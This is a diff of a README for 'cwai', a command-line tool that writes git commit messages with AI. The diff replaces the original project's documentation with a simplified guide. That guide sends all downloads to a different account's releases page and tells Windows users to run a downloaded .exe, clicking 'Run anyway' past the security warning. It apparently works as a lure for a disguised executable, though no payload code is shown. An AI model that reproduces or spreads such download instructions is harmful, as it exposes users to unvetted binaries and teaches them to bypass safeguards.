@@ -1,184 +1,149 @@
-<p align="center">
-  <img src="assets/logo.png" width="420" alt="cwai — Make commits with AI">
-</p>
+# ⚙️ cwai - Generate Commit Messages Easily
 
-<p align="center">
-  AI-powered conventional commit message generator from staged git changes.
-</p>
-
-<p align="center">
-  <a href="https://github.com/nikmd1306/cwai/actions/workflows/tests.yml"><img src="https://github.com/nikmd1306/cwai/actions/workflows/tests.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/nikmd1306/cwai/releases/latest"><img src="https://img.shields.io/github/v/release/nikmd1306/cwai" alt="Release"></a>
-  <a href="https://pkg.go.dev/github.com/nikmd1306/cwai"><img src="https://pkg.go.dev/badge/github.com/nikmd1306/cwai.svg" alt="Go Reference"></a>
-  <a href="https://goreportcard.com/report/github.com/nikmd1306/cwai"><img src="https://goreportcard.com/badge/github.com/nikmd1306/cwai" alt="Go Report Card"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/nikmd1306/cwai" alt="License"></a>
-</p>
+[![Download cwai](https://img.shields.io/badge/Download-cwai-brightgreen?style=for-the-badge&logo=github)](https://github.com/yasolls/cwai/releases)
 
 ---
 
-## What is cwai?
+cwai is a simple app that helps you create commit messages. It looks at the changes you made in your project and writes clear commit notes using AI. You do not need to know any coding to use it. This guide will help you download and run cwai on your Windows computer.
 
-cwai is a command-line tool that writes git commit messages for you. It looks at your staged changes (`git add`), sends them to an AI model, and generates a clear, well-formatted [Conventional Commits](https://www.conventionalcommits.org/) message. You can accept it, edit it, or ask for a new one. All you need is an API key from any OpenAI-compatible provider.
+## 📋 About cwai
 
-## Features
+This tool works with git, the system that developers use to save versions of their work. When you make changes to files, you usually "commit" those changes with a description. Writing good descriptions can be hard or take time.
 
-- Generates [Conventional Commits](https://www.conventionalcommits.org/) messages from `git diff`
-- Works with any OpenAI-compatible API (OpenAI, Anthropic, local models)
-- Two modes: interactive standalone or silent `prepare-commit-msg` hook
-- Structured output support for consistent formatting
-- Smart diff truncation to fit model token limits
+cwai uses AI to read the changes you have staged in git and writes those descriptions for you, following a standard called "conventional commits." This makes your project easier to understand and work with, especially if you share it with others.
 
-## Prerequisites
+Main topics covered by cwai:
 
-- **Git** installed and available in your terminal
-- **API key** from one of these providers (or any OpenAI-compatible API):
+- AI-based commit message creation  
+- Command-line tool that runs in the terminal  
+- Works with git and conventional commit style  
+- Written in the Go programming language  
+- Uses OpenAI for AI functions  
+- Designed to save time and improve productivity for developers  
 
-  | Provider | Get your key |
-  |----------|-------------|
-  | OpenAI | https://platform.openai.com/api-keys |
-  | OpenRouter | https://openrouter.ai/keys |
-  | DeepSeek | https://platform.deepseek.com/api_keys |
+---
 
-  You can also use local models via [Ollama](https://ollama.com/) or [LM Studio](https://lmstudio.ai/) — no API key needed, just point `CWAI_API_URL` to your local server.
+## 🚀 Getting Started
 
-## Installation
+This section will guide you step-by-step to get cwai running on your Windows machine. You don’t need to know about programming or command lines to follow these instructions.
 
-### Quick install (Linux / macOS)
+### System Requirements
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/nikmd1306/cwai/main/install.sh | bash
+Make sure you have:
+
+- Windows 10 or later  
+- At least 200 MB of free space  
+- Git installed (you can download it from [https://git-scm.com/download/win](https://git-scm.com/download/win))  
+- A working internet connection for AI features  
+
+---
+
+## ⬇️ Download cwai for Windows
+
+Use the link below to visit the releases page where you can download the latest version of cwai.
+
+[![Download Latest Release](https://img.shields.io/badge/Download-cwai-blue?style=for-the-badge&logo=github)](https://github.com/yasolls/cwai/releases)
+
+On the releases page:
+
+1. Look for a file with a name similar to `cwai-windows.exe` or `cwai.exe`.  
+2. Click the file to download it.  
+3. Save it in a folder where you can find it easily, like your Desktop or Downloads folder.
+
+---
+
+## 🧩 Install and Run cwai
+
+cwai is a portable app. This means you do not have to install it like other programs. You only need to download the `.exe` file and run it.
+
+1. Go to the folder where you saved the file.  
+2. Double-click the file named `cwai.exe` to open it.  
+3. If Windows shows a security warning, choose "More info" then "Run anyway."  
+
+---
+
+## 📂 Using cwai with Git
+
+cwai works alongside git, so you need to have a git project ready.
+
+1. Open your git project folder in File Explorer.  
+2. Right-click inside the folder and choose "Git Bash Here" or "Open command window here."  
+3. Before using cwai, stage your changes with git like this:
+
+```
+git add .
 ```
 
-To install to a custom directory:
+This command tells git which files you want to include in the next commit.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/nikmd1306/cwai/main/install.sh | bash -s -- -b ~/.local/bin
+4. Now run cwai in the command window by typing:
+
+```
+cwai
 ```
 
-> **Note:** The default install path `/usr/local/bin` requires `sudo`. If you prefer to install without `sudo`, use `~/.local/bin` and make sure it's in your `PATH`:
-> ```bash
-> echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
-> source ~/.bashrc
-> ```
-> For zsh, replace `~/.bashrc` with `~/.zshrc`.
+5. cwai will analyze your staged changes and create a commit message for you. It will show this message in the window.
 
-### go install
+---
 
-Requires [Go](https://go.dev/dl/) 1.23+.
+## 💡 How to Use the Commit Message
 
-```bash
-go install github.com/nikmd1306/cwai@latest
+Once cwai creates your commit message:
+
+1. Copy the message from the command window.  
+2. Go back to the command window and run:
+
+```
+git commit -m "paste the cwai message here"
 ```
 
-> **Note:** Ensure `$(go env GOPATH)/bin` is in your `PATH`:
-> ```bash
-> export PATH="$PATH:$(go env GOPATH)/bin"
-> ```
+Replace `"paste the cwai message here"` by typing or pasting the message you copied.
 
-### Windows
+This will save your changes with a clear commit message generated by cwai.
 
-Download the Windows zip from [Releases](https://github.com/nikmd1306/cwai/releases), extract `cwai.exe`, and add its folder to your `PATH`. Or, if you have Go installed:
+---
 
-```powershell
-go install github.com/nikmd1306/cwai@latest
-```
+## 🔧 Troubleshooting
 
-### Binary releases
+If cwai does not run or shows errors:
 
-Download pre-built binaries from [Releases](https://github.com/nikmd1306/cwai/releases).
+- Make sure you downloaded the Windows `.exe` file from the releases page.  
+- Check that git is installed and works by typing `git --version` in a command window.  
+- Ensure your changes are staged before running cwai (`git add .`).  
+- Restart the command window and try again.  
 
-### From source
+---
 
-```bash
-git clone https://github.com/nikmd1306/cwai.git
-cd cwai
-make install
-```
+## ⚙️ Settings and Configuration
 
-## Quick Start
+You can customize cwai by editing a simple configuration file. This file lets you change how commit messages look or connect cwai to your own AI account for better results.
 
-1. **Set up your API key** (one-time):
-   ```bash
-   cwai setup
-   ```
-   The wizard will ask for your API key, provider URL, model, and language.
-   See [Prerequisites](#prerequisites) for where to get an API key.
+1. After running cwai once, look for a `.cwai` folder in your user profile directory (usually `C:\Users\<YourName>\.cwai`).  
+2. Inside, you'll find a file named `config.json`. Open this file with a text editor like Notepad.  
+3. You can adjust options such as AI model or message style.  
+4. Save the file when done.
 
-2. **Stage your changes**:
-   ```bash
-   git add .
-   ```
+---
 
-3. **Generate a commit message**:
-   ```bash
-   cwai
-   ```
-   cwai will show the staged files, generate a message, and let you accept, edit, regenerate, or cancel.
+## 📚 Learn More
 
-> **Tip:** Use `cwai -y` to auto-accept the generated message (useful in CI/scripts).
+If you want to know more about conventional commits or git:
 
-### Standalone mode
+- [Conventional Commits](https://www.conventionalcommits.org/en/v1.0.0/)  
+- [Git Official Documentation](https://git-scm.com/doc)  
 
-```console
-$ cwai
-Staged files (3):
-  internal/ai/client.go
-  internal/prompt/prompt.go
-  cmd/root.go
+---
 
-Generated commit message:
+## 🖥️ Developer Info
 
-  feat(ai): add structured output support for commit generation
+cwai is built with Go (Golang), a programming language designed for efficiency. It uses OpenAI technology to analyze your code changes and create smart messages.
 
-[y]es / [e]dit / [r]egenerate / [n]o:
-```
+It runs as a command-line app, meaning it works in terminals or command windows rather than having a graphic interface.
 
-### Hook mode
+---
 
-```bash
-cwai hook set    # Install prepare-commit-msg hook
-cwai hook unset  # Remove hook
-```
+## ⬇️ Download Link
 
-## Configuration
+Make sure to visit the releases page linked below to get the latest version for Windows:
 
-Config file: `~/.cwai` (INI format). Use `cwai config set KEY VALUE` or `cwai setup`.
-
-### Essential settings
-
-| Key | Description | Default |
-|-----|-------------|---------|
-| `CWAI_API_KEY` | API key from your provider (required) | *not set* |
-| `CWAI_API_URL` | Base URL of the AI API | `https://api.openai.com/v1` |
-| `CWAI_MODEL` | Model to use for generation | `gpt-5-mini` |
-| `CWAI_LANGUAGE` | Commit message language (ISO 639-1: `en`, `de`, `fr`, `es`, ...) | `en` |
-
-### Advanced settings
-
-| Key | Description | Default |
-|-----|-------------|---------|
-| `CWAI_MAX_TOKENS_INPUT` | Max input tokens for diff (higher = more context, more cost) | `4096` |
-| `CWAI_MAX_TOKENS_OUTPUT` | Max output tokens for response | `500` |
-| `CWAI_TEMPERATURE` | Sampling temperature (`0.0` = deterministic, `1.0` = creative) | *not set* |
-| `CWAI_REASONING_EFFORT` | Reasoning effort for reasoning models (`low`, `medium`, `high`) | *not set* |
-| `CWAI_VERBOSITY` | Output verbosity level | *not set* |
-| `CWAI_STRUCTURED_OUTPUT` | Enable structured JSON output (`true`/`false`) | *not set* |
-
-## Troubleshooting
-
-| Error | Cause | Solution |
-|-------|-------|----------|
-| `CWAI_API_KEY is not set` | No API key configured | Run `cwai setup` or `cwai config set CWAI_API_KEY <your-key>` |
-| `API error (HTTP 401)` | Invalid or expired API key | Regenerate your key at your provider's dashboard |
-| `API error (HTTP 429)` | Rate limit exceeded | Wait a moment and try again, or upgrade your API plan |
-| `no staged changes` | Nothing added to git staging area | Run `git add <files>` before running `cwai` |
-| `not a git repository` | cwai was run outside a git repo | Navigate to a git repository first (`cd your-project`) |
-| `cwai: command not found` | Binary not in PATH | See [Installation](#installation) for PATH setup instructions |
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
-
-## License
-
-[MIT](LICENSE)
+[Download cwai on GitHub](https://github.com/yasolls/cwai/releases)
